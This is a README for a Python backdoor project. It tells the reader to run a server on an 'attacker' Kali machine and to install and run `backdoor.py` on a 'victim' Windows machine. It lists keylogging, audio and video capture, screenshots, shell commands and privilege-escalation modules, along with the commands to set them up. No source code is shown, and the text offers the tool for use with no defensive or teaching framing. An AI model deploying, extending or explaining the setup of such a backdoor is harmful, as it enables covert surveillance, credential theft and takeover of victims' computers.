# Backdoor Setup Instructions

## Overview
This backdoor consists of two components:
1. **Target Machine (Windows)** - Runs `backdoor.py` (needs Python 3.4.3)
2. **Attacker Machine (Kali)** - Runs `server.py` (uses current Python)

## Requirements

### Target Machine (Windows with Python 3.4.3)
The victim Windows machine needs these packages installed:

```bash
pip install -r requirements.txt
```

This installs Python 3.4.3 compatible versions of:
- pywin32 (Windows API access)
- pynput (keylogging)
- PyAudio (audio recording)
- opencv-python (video recording)
- Pillow (screenshots)
- PyAutoGUI (screen automation)
- numpy (image processing)
- psutil (system info)
- requests (network requests)

### Attacker Machine (Kali Linux - Current Python)
The attacker machine running `server.py` needs **NO additional packages**!

```bash
# No requirements needed - uses only Python standard library
python3 server.py
```

The server only uses:
- socket (network communication)
- json (data encoding)
- os (file operations)
- time (delays)
- subprocess (shell commands)

## Usage

### 1. On Attacker Machine (Kali):
```bash
python3 server.py
```

### 2. On Target Machine (Windows):
```bash
# Install requirements first (Python 3.4.3)
pip install -r requirements.txt

# Run the backdoor
python backdoor.py
```

## Files
- `requirements.txt` - For target Windows machine (Python 3.4.3)
- `requirements-server.txt` - For attacker machine (explains no deps needed)
- `backdoor.py` - Runs on target machine
- `server.py` - Runs on attacker machine
- `features/` - Feature modules (keylogger, recording, privilege escalation)
